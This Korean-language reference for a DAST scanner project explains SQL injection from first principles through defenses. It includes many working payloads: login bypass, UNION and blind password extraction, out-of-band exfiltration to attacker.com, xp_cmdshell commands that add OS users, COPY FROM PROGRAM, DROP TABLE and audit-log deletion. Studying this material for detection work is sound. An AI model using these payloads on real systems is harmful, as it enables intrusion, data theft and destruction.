# SQL Injection 완전 정복

> MVP DAST 프로젝트의 기초 지식 문서
> 버전: 1.0
> 최종 수정: 2025-01-26

---

## 목차

1. [SQLi의 본질 (First Principles)](#1-sqli의-본질-first-principles)
2. [공격 목표와 영향 (Impact)](#2-공격-목표와-영향-impact)
3. [SQL Injection 분류 체계](#3-sql-injection-분류-체계)
4. [SQL 문법 기초 (SQLi 관점)](#4-sql-문법-기초-sqli-관점)
5. [컨텍스트별 주입 기법](#5-컨텍스트별-주입-기법)
6. [데이터 추출 절차](#6-데이터-추출-절차)
7. [방어 메커니즘 이해](#7-방어-메커니즘-이해)
8. [SQLi 탐지 지표 (DAST 관점)](#8-sqli-탐지-지표-dast-관점)
9. [ORM/Framework SQLi](#9-ormframework-sqli)
10. [종합 분류 매트릭스](#10-종합-분류-매트릭스)

---

## 1. SQLi의 본질 (First Principles)

### 1.1 SQL Injection이란?

```
핵심 정의:
사용자 입력이 "데이터"가 아닌 "코드"로 해석되는 취약점
```

**정상적인 의도:**
```sql
-- 개발자 의도: username에 "admin"이라는 "값"이 들어감
SELECT * FROM users WHERE username = 'admin'
                                      ↑
                                   데이터
```

**SQL Injection:**
```sql
-- 공격자 입력: admin' OR '1'='1
SELECT * FROM users WHERE username = 'admin' OR '1'='1'
                                      ↑          ↑
                                   데이터      코드(!)

-- 원래 데이터 영역에 SQL 코드가 "주입"됨
```

### 1.2 왜 발생하는가? (Root Cause)

```
┌─────────────────────────────────────────────────────────────┐
│                    근본 원인                                 │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│   SQL은 "코드"와 "데이터"를 같은 채널로 전송                │
│                                                              │
│   ┌──────────┐    ┌──────────┐    ┌──────────┐            │
│   │ 코드     │ +  │ 데이터   │ =  │ 쿼리     │            │
│   │ SELECT   │    │ 'admin'  │    │ 문자열   │            │
│   └──────────┘    └──────────┘    └──────────┘            │
│        ↓               ↓               ↓                   │
│   "SELECT * FROM users WHERE username = '" + input + "'"   │
│                                                              │
│   문자열 연결(Concatenation) = 경계 파괴의 시작            │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

**비유:**
```
우편 시스템에 비유:

정상: 봉투(코드) 안에 편지(데이터)
     봉투 = "이 사람에게 전달해줘"
     편지 = "안녕하세요"

SQLi: 편지 내용에 "이 봉투를 버리고 다른 사람에게 전달해" 라고 씀
      → 우체부가 편지 내용을 명령으로 해석
      → 봉투의 원래 지시가 무시됨
```

### 1.3 SQL의 구조적 특성

```sql
SQL 문장의 구성요소:

┌─────────────────────────────────────────────────────────────┐
│  SELECT  column  FROM  table  WHERE  condition  ;          │
│    ↓       ↓       ↓     ↓      ↓       ↓       ↓          │
│  키워드  식별자  키워드 식별자 키워드  표현식  종결자       │
└─────────────────────────────────────────────────────────────┘

문자열 리터럴의 경계:
'hello'  →  ' (시작) + hello (내용) + ' (종료)
   ↓
   공격자가 ' 를 주입하면 경계가 깨짐
```

---

## 2. 공격 목표와 영향 (Impact)

### 2.1 SQLi 공격 목표 (Attack Goals)

```
┌─────────────────────────────────────────────────────────────┐
│                    SQLi 공격 목표 계층                       │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  Level 1: 정보 수집 (Information Gathering)                 │
│  ├─ DBMS 버전/종류 식별                                     │
│  ├─ 테이블/컬럼 구조 파악                                   │
│  └─ 사용자 권한 수준 확인                                   │
│                                                              │
│  Level 2: 데이터 탈취 (Data Exfiltration)                   │
│  ├─ 사용자 인증정보 (credentials)                           │
│  ├─ 개인정보 (PII: 이름, 이메일, 주소)                     │
│  ├─ 금융정보 (카드번호, 계좌정보)                          │
│  └─ 비즈니스 기밀 데이터                                    │
│                                                              │
│  Level 3: 인증 우회 (Authentication Bypass)                 │
│  ├─ 로그인 우회 (' OR '1'='1)                              │
│  ├─ 권한 상승 (일반 → 관리자)                              │
│  └─ 세션/토큰 탈취                                          │
│                                                              │
│  Level 4: 데이터 조작 (Data Manipulation)                   │
│  ├─ 데이터 수정 (UPDATE)                                    │
│  ├─ 데이터 삽입 (INSERT)                                    │
│  └─ 데이터 삭제 (DELETE/DROP)                               │
│                                                              │
│  Level 5: 시스템 장악 (System Compromise)                   │
│  ├─ OS 명령 실행 (xp_cmdshell, COPY PROGRAM)               │
│  ├─ 파일 읽기/쓰기 (LOAD_FILE, INTO OUTFILE)               │
│  ├─ 웹쉘 업로드                                             │
│  └─ 내부 네트워크 피봇팅                                    │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

### 2.2 비즈니스 영향 (Business Impact)

```yaml
impact_categories:
  confidentiality:  # 기밀성 침해
    - 고객 데이터 유출
    - 영업 비밀 노출
    - 규제 위반 (GDPR, 개인정보보호법)

  integrity:  # 무결성 침해
    - 금융 거래 조작
    - 로그/감사 기록 변조
    - 콘텐츠 위변조

  availability:  # 가용성 침해
    - 데이터베이스 파괴 (DROP TABLE)
    - 서비스 거부 (무거운 쿼리)
    - 랜섬웨어 감염 경로

severity_levels:
  critical:
    - 금융정보 대량 유출
    - 시스템 명령 실행 가능
    - 전체 DB 접근 가능

  high:
    - 인증정보 유출
    - 관리자 권한 획득
    - 다른 사용자 데이터 접근

  medium:
    - 제한된 데이터 유출
    - 자신의 권한 내 데이터 조작

  low:
    - DB 버전 정보만 유출
    - 에러 메시지 노출
```

### 2.3 공격 체인 예시 (Attack Chain)

```
┌─────────────────────────────────────────────────────────────┐
│                  전형적인 SQLi 공격 체인                     │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  1. 정찰 (Reconnaissance)                                   │
│     ' → 에러 발생 → SQLi 가능성 확인                        │
│                        ↓                                    │
│  2. DBMS 식별                                               │
│     특수 문법/에러 메시지로 MySQL/MSSQL/Oracle 판별         │
│                        ↓                                    │
│  3. 데이터 구조 파악                                        │
│     information_schema 조회 → 테이블/컬럼명 획득            │
│                        ↓                                    │
│  4. 데이터 추출                                             │
│     UNION SELECT / Blind로 민감 데이터 탈취                 │
│                        ↓                                    │
│  5. 권한 상승 (선택)                                        │
│     DB 관리자 계정 획득 또는 xp_cmdshell 활성화             │
│                        ↓                                    │
│  6. 지속성 확보 (선택)                                      │
│     웹쉘 업로드, 백도어 계정 생성                           │
│                        ↓                                    │
│  7. 내부 이동 (선택)                                        │
│     DB Link 통해 다른 서버 접근                             │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

---

## 3. SQL Injection 분류 체계

### 2.1 대분류: 데이터 추출 방식

```
┌─────────────────────────────────────────────────────────────┐
│                SQL Injection 대분류                          │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  ┌─────────────────┐  ┌─────────────────┐  ┌─────────────┐ │
│  │    In-band      │  │     Blind       │  │  Out-of-band│ │
│  │   (직접 채널)   │  │  (추론 기반)    │  │  (외부 채널)│ │
│  └────────┬────────┘  └────────┬────────┘  └──────┬──────┘ │
│           │                    │                   │        │
│  ┌────────┴────────┐  ┌────────┴────────┐         │        │
│  │Error  │ Union   │  │Boolean │ Time   │    DNS/HTTP     │
│  │-based │ -based  │  │-based  │ -based │    exfil        │
│  └───────┴─────────┘  └────────┴────────┘                  │
│                                                              │
└─────────────────────────────────────────────────────────────┘

In-band:  같은 채널로 결과 수신 (HTTP 요청 → HTTP 응답에 데이터)
Blind:    직접 결과 안 보임, 간접 신호로 추론 (참/거짓, 시간 지연)
Out-of-band: 다른 채널로 결과 수신 (DNS 요청, HTTP 콜백)
```

### 2.2 중분류: 기법별 상세

#### A. In-band SQLi

**A-1. Error-based SQLi**
```
원리: DB 에러 메시지에 원하는 데이터를 포함시킴

┌─────────────────────────────────────────────────────────────┐
│ 공격자 → 의도적 에러 유발 → DB가 에러+데이터 반환         │
└─────────────────────────────────────────────────────────────┘

예시 (MySQL):
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--

결과:
"XPATH syntax error: '~5.7.32~'"
                      ↑ 버전 정보가 에러 메시지에 포함

전제조건:
- 에러 메시지가 사용자에게 노출되어야 함
- DBMS가 상세한 에러를 반환해야 함
```

**A-2. Union-based SQLi**
```
원리: UNION으로 원래 쿼리에 추가 SELECT 결합

┌─────────────────────────────────────────────────────────────┐
│ 원래 쿼리 결과 + UNION + 공격자 쿼리 결과 = 합쳐진 출력   │
└─────────────────────────────────────────────────────────────┘

원래 쿼리:
SELECT name, price FROM products WHERE id = '1'

공격:
SELECT name, price FROM products WHERE id = '1'
UNION SELECT username, password FROM users--'

결과:
| name      | price    |
|-----------|----------|
| Product1  | 100      |  ← 원래 결과
| admin     | hash123  |  ← 주입된 결과

전제조건:
- 컬럼 수가 일치해야 함
- 데이터 타입이 호환되어야 함
- 결과가 화면에 출력되어야 함
```

#### B. Blind SQLi

**B-1. Boolean-based Blind**
```
원리: 참/거짓에 따른 응답 차이로 한 비트씩 추출

┌─────────────────────────────────────────────────────────────┐
│  조건 참 → 응답 A (정상 페이지)                            │
│  조건 거짓 → 응답 B (다른 페이지 / 빈 결과)                │
└─────────────────────────────────────────────────────────────┘

예시:
' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--
→ 응답이 정상이면 첫 글자가 'a'

' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='b'--
→ 응답이 다르면 첫 글자가 'b'가 아님

ASCII 이진 탐색:
' AND ASCII(SUBSTRING(username,1,1)) > 64--  (64 = '@')
→ 참이면 65 이상, 거짓이면 64 이하
→ 이진 탐색으로 정확한 값 찾기

특징:
- 매우 느림 (한 문자당 7-8 요청)
- 하지만 거의 모든 상황에서 작동
- 응답 차이만 있으면 됨 (에러 노출 불필요)
```

**B-2. Time-based Blind**
```
원리: 조건에 따라 의도적 지연 발생

┌─────────────────────────────────────────────────────────────┐
│  조건 참 → SLEEP 실행 → 응답 지연                          │
│  조건 거짓 → SLEEP 미실행 → 즉시 응답                      │
└─────────────────────────────────────────────────────────────┘

예시 (MySQL):
' AND IF((SELECT SUBSTRING(username,1,1) FROM users)='a', SLEEP(5), 0)--
→ 첫 글자가 'a'면 5초 지연

DBMS별 지연 함수:
- MySQL:      SLEEP(n), BENCHMARK(count, expr)
- PostgreSQL: pg_sleep(n)
- MSSQL:      WAITFOR DELAY '0:0:n'
- Oracle:     DBMS_PIPE.RECEIVE_MESSAGE('x',n)

특징:
- Boolean-based보다 더 느림
- 하지만 응답 내용 차이 없어도 가능
- 네트워크 지연과 구분 필요 (여러 번 확인)
```

#### C. Out-of-band SQLi

```
원리: DB가 외부 서버로 데이터를 전송하게 함

┌─────────────────────────────────────────────────────────────┐
│  DB → (DNS/HTTP 요청) → 공격자 서버 (데이터 수신)          │
└─────────────────────────────────────────────────────────────┘

예시 (MySQL - DNS):
' AND LOAD_FILE(CONCAT('\\\\',
    (SELECT password FROM users LIMIT 1),
    '.attacker.com\\a'))--

→ DB가 "password123.attacker.com" 으로 DNS 조회
→ 공격자의 DNS 서버에 password가 기록됨

예시 (MSSQL - HTTP):
'; EXEC master..xp_dirtree '\\attacker.com\share'--

전제조건:
- DB 서버가 외부 네트워크 접근 가능해야 함
- 해당 함수/기능이 활성화되어 있어야 함
- 권한이 있어야 함

장점:
- 매우 빠름 (한 번에 대량 데이터)
- In-band/Blind 불가능한 상황에서 유용
```

### 2.3 소분류: 주입 위치별

```
┌─────────────────────────────────────────────────────────────┐
│                  주입 위치별 분류                            │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  1. WHERE 절 주입 (가장 흔함)                               │
│     SELECT * FROM users WHERE id = '[INJECTION]'            │
│                                                              │
│  2. ORDER BY 절 주입                                        │
│     SELECT * FROM users ORDER BY [INJECTION]                │
│     → 문자열 컨텍스트 아님, 따옴표 불필요                   │
│                                                              │
│  3. INSERT 문 주입                                          │
│     INSERT INTO logs VALUES ('[INJECTION]', ...)            │
│     → 데이터 삽입 + 추가 INSERT 가능                        │
│                                                              │
│  4. UPDATE 문 주입                                          │
│     UPDATE users SET email='[INJECTION]' WHERE id=1         │
│     → 다른 컬럼/레코드 수정 가능                            │
│                                                              │
│  5. GROUP BY / HAVING 절 주입                               │
│     SELECT * FROM users GROUP BY [INJECTION]                │
│                                                              │
│  6. LIMIT / OFFSET 절 주입                                  │
│     SELECT * FROM users LIMIT [INJECTION]                   │
│     → MySQL에서 프로시저 콜 가능                            │
│                                                              │
│  7. 테이블명 / 컬럼명 주입                                  │
│     SELECT * FROM [INJECTION]                               │
│     → 식별자 컨텍스트, 따옴표 처리 다름                     │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

### 3.4 특수 유형

**Second-Order SQLi (2차 주입)**
```
┌─────────────────────────────────────────────────────────────┐
│                    Second-Order SQLi 흐름                    │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  Phase 1: 주입 (Injection)                                  │
│  ┌──────────┐    ┌──────────┐    ┌──────────┐              │
│  │ 사용자   │ →  │ 앱 서버  │ →  │ DB 저장  │              │
│  │ 입력     │    │ 이스케이프│    │ (안전)  │              │
│  │ admin'-- │    │ admin\'--│    │ admin'--│              │
│  └──────────┘    └──────────┘    └──────────┘              │
│                                                              │
│  Phase 2: 실행 (Execution) - 나중에 발생                   │
│  ┌──────────┐    ┌──────────┐    ┌──────────┐              │
│  │ DB 조회  │ →  │ 앱 서버  │ →  │ 새 쿼리  │              │
│  │ admin'-- │    │ 그대로   │    │ 주입 실행│              │
│  │ (원본)   │    │ 사용     │    │ (위험!)  │              │
│  └──────────┘    └──────────┘    └──────────┘              │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

**상세 시나리오:**
```sql
-- 시나리오 1: 비밀번호 변경
-- Step 1: 회원가입
INSERT INTO users (username, password) VALUES ('admin''--', 'pass123');
-- 이스케이프되어 DB에는 admin'-- 저장

-- Step 2: 비밀번호 변경 (취약한 코드)
$user = get_current_username();  -- DB에서 admin'-- 조회
$query = "UPDATE users SET password='$newpass' WHERE username='$user'";
-- 결과: UPDATE users SET password='new' WHERE username='admin'--'
-- admin 계정의 비밀번호가 변경됨!

-- 시나리오 2: 프로필 조회
-- Step 1: 프로필 이름 설정
UPDATE profiles SET display_name = ''' OR ''1''=''1' WHERE user_id = 5;

-- Step 2: 다른 기능에서 프로필 조회
SELECT * FROM messages WHERE sender_name = '프로필에서 가져온 이름';
-- 결과: SELECT * FROM messages WHERE sender_name = '' OR '1'='1'

-- 시나리오 3: 로그 분석 시스템
-- Step 1: User-Agent에 페이로드 삽입
User-Agent: Mozilla'; DROP TABLE logs;--

-- Step 2: 로그 분석 배치 작업에서 실행
SELECT * FROM logs WHERE user_agent LIKE '%Mozilla'; DROP TABLE logs;--%';
```

**탐지의 어려움:**
```yaml
detection_challenges:
  - 입력과 실행이 시간적/공간적으로 분리
  - 자동화 도구로 탐지 어려움 (인과관계 추적 필요)
  - WAF가 입력 시점에 정상으로 판단

dast_detection_strategy:
  - 저장 후 트리거 기능 테스트
  - 프로필/설정 변경 → 다른 기능 영향 분석
  - 로그/감사 기능 관련 입력점 주의
```

**Stacked Queries (다중 쿼리)**
```
┌─────────────────────────────────────────────────────────────┐
│                    Stacked Query 구조                        │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  정상 쿼리  ;  주입된 쿼리  ;  주입된 쿼리                  │
│      ↓             ↓              ↓                         │
│  SELECT...  ;  INSERT...  ;  UPDATE...                      │
│      ↓             ↓              ↓                         │
│   결과 반환     실행됨        실행됨                        │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

**DBMS별 지원 상세:**
```yaml
stacked_query_support:
  mssql:
    support: "full"
    examples:
      - "'; EXEC xp_cmdshell 'whoami';--"
      - "'; INSERT INTO admins VALUES('hacker','pass');--"
      - "'; WAITFOR DELAY '0:0:5';--"
    notes: "기본적으로 모든 드라이버에서 지원"

  postgresql:
    support: "full"
    examples:
      - "'; CREATE TABLE test(data text);--"
      - "'; COPY test FROM PROGRAM 'id';--"
      - "'; DROP TABLE users;--"
    notes: "기본적으로 모든 드라이버에서 지원"

  mysql:
    support: "conditional"
    driver_support:
      mysqli_multi_query: "✅ 지원"
      mysqli_query: "❌ 미지원"
      PDO_default: "❌ 미지원"
      PDO_ATTR_EMULATE_PREPARES: "⚠️ 설정에 따라"
    examples:
      - "'; DROP TABLE users;#"
      - "'; INSERT INTO logs VALUES(1, @@version);#"
    notes: "대부분의 실제 환경에서 미지원"

  oracle:
    support: "none"
    alternative: "PL/SQL 블록 사용 (제한적)"
    examples:
      - "BEGIN EXECUTE IMMEDIATE 'DROP TABLE x'; END;"
    notes: "일반적인 SQLi에서 Stacked Query 불가"

  sqlite:
    support: "conditional"
    notes: "sqlite3_exec()는 지원, sqlite3_prepare()는 미지원"
```

**Stacked Query로 가능한 공격:**
```sql
-- 데이터 삽입 (백도어 계정)
'; INSERT INTO users(username,password,role) VALUES('backdoor','hacked','admin');--

-- 데이터 수정 (권한 상승)
'; UPDATE users SET role='admin' WHERE username='attacker';--

-- 데이터 삭제
'; DELETE FROM logs WHERE 1=1;--
'; TRUNCATE TABLE audit_log;--
'; DROP TABLE users;--

-- 스키마 변경
'; ALTER TABLE users ADD backdoor VARCHAR(100);--

-- 시스템 명령 (MSSQL)
'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--
'; EXEC xp_cmdshell 'net user hacker P@ss /add';--

-- 파일 작업 (PostgreSQL)
'; COPY (SELECT * FROM users) TO '/tmp/users.csv';--
```

### 3.5 Blind SQLi 최적화 기법

**이진 탐색 (Binary Search) 알고리즘:**
```
┌─────────────────────────────────────────────────────────────┐
│                    Binary Search 최적화                      │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  목표: 한 문자를 최소 요청으로 추출                         │
│                                                              │
│  선형 탐색: a→b→c→...→z (최대 26회)                        │
│  이진 탐색: 중간값 비교 반복 (최대 7회, ASCII 0-127)        │
│                                                              │
│  예시: 문자 'm' (ASCII 109) 찾기                            │
│  ┌─────────────────────────────────────────┐                │
│  │ Step 1: >64? → True  (범위: 65-127)    │                │
│  │ Step 2: >96? → True  (범위: 97-127)    │                │
│  │ Step 3: >112? → False (범위: 97-112)   │                │
│  │ Step 4: >104? → True  (범위: 105-112)  │                │
│  │ Step 5: >108? → True  (범위: 109-112)  │                │
│  │ Step 6: >110? → False (범위: 109-110)  │                │
│  │ Step 7: >109? → False → 값은 109 (m)   │                │
│  └─────────────────────────────────────────┘                │
│                                                              │
│  선형: 13회 (a~m) vs 이진: 7회 = 46% 절약                   │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

**비트 단위 추출:**
```sql
-- 7비트 (ASCII 0-127)를 각각 추출
-- 각 비트당 1회 요청 = 정확히 7회

-- Bit 6 (64의 자리)
' AND (ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)) & 64) = 64--

-- Bit 5 (32의 자리)
' AND (ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)) & 32) = 32--

-- ... Bit 0 (1의 자리)
' AND (ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)) & 1) = 1--

-- 장점: 항상 정확히 7회 (예측 가능)
-- 단점: 복잡한 페이로드, 일부 DBMS 비트 연산 제한
```

**병렬 요청 (Parallelization):**
```yaml
parallel_strategy:
  description: "여러 문자를 동시에 추출"

  implementation:
    - 각 문자 위치별 별도 스레드
    - Connection Pool 활용
    - Rate Limiting 고려

  example:
    # 동시에 10개 문자 추출 시도
    thread_1: "SUBSTRING(...,1,1)"  # 1번째 문자
    thread_2: "SUBSTRING(...,2,1)"  # 2번째 문자
    thread_3: "SUBSTRING(...,3,1)"  # 3번째 문자
    # ...

  speedup: "N개 스레드 시 최대 N배 속도 향상"
  caution: "서버 부하, WAF 탐지 주의"
```

**Time-based 최적화:**
```yaml
time_optimization:
  # 지연 시간 단축
  short_delay:
    problem: "긴 SLEEP은 전체 시간 증가"
    solution: "최소 탐지 가능 시간 사용 (0.5~1초)"
    tradeoff: "네트워크 지터와 구분 어려움"

  # 조기 종료
  early_termination:
    description: "NULL 또는 문자열 끝 감지 시 중단"
    payload: "' AND IF(LENGTH(...)=5, SLEEP(2), 0)--"

  # 일괄 확인
  batch_check:
    description: "여러 조건을 한 번에 확인"
    payload: "' AND IF(SUBSTRING(...)='admin', SLEEP(2), 0)--"
    use_case: "예상 값이 있을 때 직접 비교"
```

---

## 4. SQL 문법 기초 (SQLi 관점)

### 4.1 문자열 처리

```sql
-- 문자열 리터럴
'hello'           -- 단일 따옴표 (표준)
"hello"           -- 이중 따옴표 (MySQL)

-- 따옴표 이스케이프
'it''s'           -- '' = 리터럴 ' (표준)
'it\'s'           -- \' = 리터럴 ' (MySQL)

-- SQLi 관점:
-- 입력: admin'
-- 쿼리: WHERE name = 'admin''  ← 문법 에러 (따옴표 미종료)
```

### 4.2 주석 문법

```sql
-- DBMS별 주석
-- (MySQL, PostgreSQL, MSSQL, Oracle) : -- 뒤에 공백 필요
--comment (X)
-- comment (O)

# (MySQL only)
#comment

/* */ (모든 DBMS)
/* 여러 줄
   주석 */

/*!50000 */ (MySQL only - 버전 조건부)
/*!50000 SELECT */ -- MySQL 5.0 이상에서만 실행

-- SQLi 활용:
admin'--          -- 뒤의 모든 것을 주석 처리
admin'#           -- MySQL에서 같은 효과
admin'/*          -- 주석 시작 (종료 없어도 됨)
```

### 4.3 연산자

```sql
-- 비교 연산자
=, <>, !=, <, >, <=, >=
LIKE, NOT LIKE
IN, NOT IN
BETWEEN
IS NULL, IS NOT NULL

-- 논리 연산자
AND, OR, NOT
&&, || (MySQL)

-- SQLi 활용:
' OR 1=1--        -- 항상 참
' OR 'x'='x       -- 항상 참 (따옴표 밸런스)
' AND 1=0--       -- 항상 거짓 (차이점 확인용)
```

### 4.4 UNION 규칙

```sql
-- UNION 기본 규칙
-- 1. 컬럼 수 일치 필수
SELECT a, b FROM t1
UNION
SELECT c, d FROM t2  -- 2개 = 2개 (OK)

-- 2. 데이터 타입 호환
SELECT name, age FROM users     -- VARCHAR, INT
UNION
SELECT 'x', 1 FROM dual         -- 호환됨

-- 3. NULL은 모든 타입과 호환
SELECT a, b, c FROM t
UNION
SELECT NULL, NULL, NULL         -- 컬럼 수 파악에 유용

-- SQLi 컬럼 수 파악 기법:
' UNION SELECT NULL--           -- 에러면 컬럼 수 ≠ 1
' UNION SELECT NULL,NULL--      -- 에러면 컬럼 수 ≠ 2
' UNION SELECT NULL,NULL,NULL-- -- 성공하면 컬럼 수 = 3

-- ORDER BY로 컬럼 수 파악:
' ORDER BY 1--                  -- 성공
' ORDER BY 5--                  -- 성공
' ORDER BY 6--                  -- 에러 → 컬럼 수 = 5
```

### 4.5 유용한 함수 (DBMS별)

```
┌─────────────────────────────────────────────────────────────┐
│                    정보 수집 함수                            │
├──────────┬──────────────────────────────────────────────────┤
│  정보    │  MySQL      PostgreSQL    MSSQL       Oracle     │
├──────────┼──────────────────────────────────────────────────┤
│ 버전     │ VERSION()   version()    @@version   v$version  │
│ 사용자   │ USER()      current_user SYSTEM_USER USER       │
│ DB명     │ DATABASE()  current_db   DB_NAME()   SYS.DB     │
│ 호스트   │ @@hostname  inet_server  HOST_NAME() UTL_INADDR │
└──────────┴──────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────┐
│                    문자열 함수                               │
├──────────┬──────────────────────────────────────────────────┤
│  기능    │  MySQL      PostgreSQL    MSSQL       Oracle     │
├──────────┼──────────────────────────────────────────────────┤
│ 연결     │ CONCAT()    ||           +           ||         │
│ 추출     │ SUBSTRING() SUBSTRING()  SUBSTRING() SUBSTR()   │
│ 길이     │ LENGTH()    LENGTH()     LEN()       LENGTH()   │
│ ASCII    │ ASCII()     ASCII()      ASCII()     ASCII()    │
│ CHAR     │ CHAR()      CHR()        CHAR()      CHR()      │
└──────────┴──────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────┐
│                    시간 지연 함수                            │
├──────────┬──────────────────────────────────────────────────┤
│  DBMS    │  함수                                            │
├──────────┼──────────────────────────────────────────────────┤
│ MySQL    │ SLEEP(5), BENCHMARK(10000000,SHA1('x'))         │
│ PgSQL    │ pg_sleep(5), pg_sleep_for('5 seconds')          │
│ MSSQL    │ WAITFOR DELAY '0:0:5'                           │
│ Oracle   │ DBMS_PIPE.RECEIVE_MESSAGE('x',5)                │
└──────────┴──────────────────────────────────────────────────┘
```

---

## 5. 컨텍스트별 주입 기법

### 5.1 String Context (문자열)

```sql
-- 원본 쿼리
SELECT * FROM users WHERE name = '[INPUT]'

-- 탈출 전략
1. 따옴표 닫기: '
2. 조건 추가: OR 1=1
3. 나머지 무효화: --

-- 페이로드
' OR 1=1--
' OR 'x'='x
' OR ''='

-- 주의: 따옴표 밸런스
'           → 문법 에러 (홀수 따옴표)
''          → 빈 문자열 (짝수 따옴표)
' OR 'x'='x → 밸런스 맞음
```

### 5.2 Numeric Context (숫자)

```sql
-- 원본 쿼리
SELECT * FROM products WHERE id = [INPUT]

-- 따옴표 없음 → 바로 주입 가능
1 OR 1=1
1 UNION SELECT NULL
1 AND 1=0

-- 주의: 타입 에러 방지
1 UNION SELECT 'string'  -- 에러 가능
1 UNION SELECT 1         -- 안전
```

### 5.3 ORDER BY Context

```sql
-- 원본 쿼리
SELECT * FROM users ORDER BY [INPUT]

-- 식별자 컨텍스트 (따옴표 X)
-- CASE를 사용한 데이터 추출
(CASE WHEN (SELECT SUBSTRING(password,1,1) FROM users)='a'
      THEN name ELSE email END)

-- 에러 기반
(SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x
FROM information_schema.tables GROUP BY x)a)
```

### 5.4 INSERT Context

```sql
-- 원본 쿼리
INSERT INTO logs (msg, user) VALUES ('[INPUT]', 'guest')

-- 페이로드
test'), ('injected', 'hacker')--
→ INSERT INTO logs (msg, user) VALUES ('test'), ('injected', 'hacker')--', 'guest')

-- 추가 레코드 삽입 가능
```

### 5.5 UPDATE Context

```sql
-- 원본 쿼리
UPDATE users SET email = '[INPUT]' WHERE id = 5

-- 다른 컬럼 수정
test', admin=1 WHERE id=5--
→ UPDATE users SET email = 'test', admin=1 WHERE id=5--' WHERE id = 5

-- 다른 레코드 수정
test' WHERE id=1--
→ UPDATE users SET email = 'test' WHERE id=1--' WHERE id = 5
```

---

## 6. 데이터 추출 절차

### 6.1 정보 수집 순서

```
┌─────────────────────────────────────────────────────────────┐
│                    SQLi 데이터 추출 로드맵                   │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  Step 1: 취약점 확인                                        │
│  └→ ' 주입 → 에러/응답 변화 확인                           │
│                                                              │
│  Step 2: DBMS 식별                                          │
│  └→ 에러 메시지, 특수 문법, 함수로 판별                    │
│                                                              │
│  Step 3: 컬럼 수 파악 (Union용)                             │
│  └→ ORDER BY n / UNION SELECT NULL,...                     │
│                                                              │
│  Step 4: 출력 위치 파악 (Union용)                           │
│  └→ UNION SELECT 1,2,3,... → 어느 숫자가 출력되는지        │
│                                                              │
│  Step 5: 메타데이터 추출                                    │
│  └→ 데이터베이스명 → 테이블명 → 컬럼명                     │
│                                                              │
│  Step 6: 데이터 추출                                        │
│  └→ 실제 데이터 (사용자, 비밀번호 등)                      │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

### 6.2 DBMS별 메타데이터 쿼리

```sql
-- MySQL
SELECT schema_name FROM information_schema.schemata          -- DB 목록
SELECT table_name FROM information_schema.tables
       WHERE table_schema='target_db'                        -- 테이블 목록
SELECT column_name FROM information_schema.columns
       WHERE table_name='users'                              -- 컬럼 목록

-- PostgreSQL
SELECT datname FROM pg_database                              -- DB 목록
SELECT tablename FROM pg_tables
       WHERE schemaname='public'                             -- 테이블 목록
SELECT column_name FROM information_schema.columns
       WHERE table_name='users'                              -- 컬럼 목록

-- MSSQL
SELECT name FROM master..sysdatabases                        -- DB 목록
SELECT name FROM sysobjects WHERE xtype='U'                  -- 테이블 목록
SELECT name FROM syscolumns
       WHERE id=OBJECT_ID('users')                           -- 컬럼 목록

-- Oracle
SELECT owner, table_name FROM all_tables                     -- 테이블 목록
SELECT column_name FROM all_tab_columns
       WHERE table_name='USERS'                              -- 컬럼 목록
```

---

## 7. 방어 메커니즘 이해

### 7.1 Parameterized Queries (근본 해결책)

```python
# 취약한 코드
query = "SELECT * FROM users WHERE id = '" + user_input + "'"

# 안전한 코드 (Parameterized)
query = "SELECT * FROM users WHERE id = ?"
cursor.execute(query, (user_input,))

# 원리:
# 쿼리 구조(코드)와 데이터가 분리되어 전송
# DB가 먼저 쿼리를 파싱 → 그 다음 데이터 바인딩
# 데이터는 절대 코드로 해석되지 않음
```

### 7.2 파라미터 바인딩의 예외 케이스

```
┌─────────────────────────────────────────────────────────────┐
│         Prepared Statement으로 해결 불가능한 경우           │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  1. 동적 테이블명/컬럼명                                    │
│     SELECT * FROM ?  ← 불가능!                              │
│     테이블명은 파라미터로 바인딩 불가                       │
│                                                              │
│  2. ORDER BY 절                                             │
│     ORDER BY ?  ← 동작하지 않거나 의도와 다르게 동작        │
│     ORDER BY 'name' → 문자열 상수로 해석 (정렬 안됨)        │
│                                                              │
│  3. LIMIT/OFFSET (일부 드라이버)                           │
│     LIMIT ?  ← 일부 드라이버에서 미지원                    │
│                                                              │
│  4. IN 절 동적 개수                                        │
│     WHERE id IN (?, ?, ?)  ← 개수가 고정되어야 함          │
│                                                              │
│  5. 스키마/데이터베이스 선택                               │
│     USE ?  ← 불가능                                         │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

**해결 방법:**
```python
# 1. 동적 테이블명 - 화이트리스트 검증
ALLOWED_TABLES = ['users', 'products', 'orders']

def get_table_data(table_name):
    if table_name not in ALLOWED_TABLES:
        raise ValueError("Invalid table name")
    # 검증 후 직접 삽입 (안전)
    query = f"SELECT * FROM {table_name}"
    cursor.execute(query)

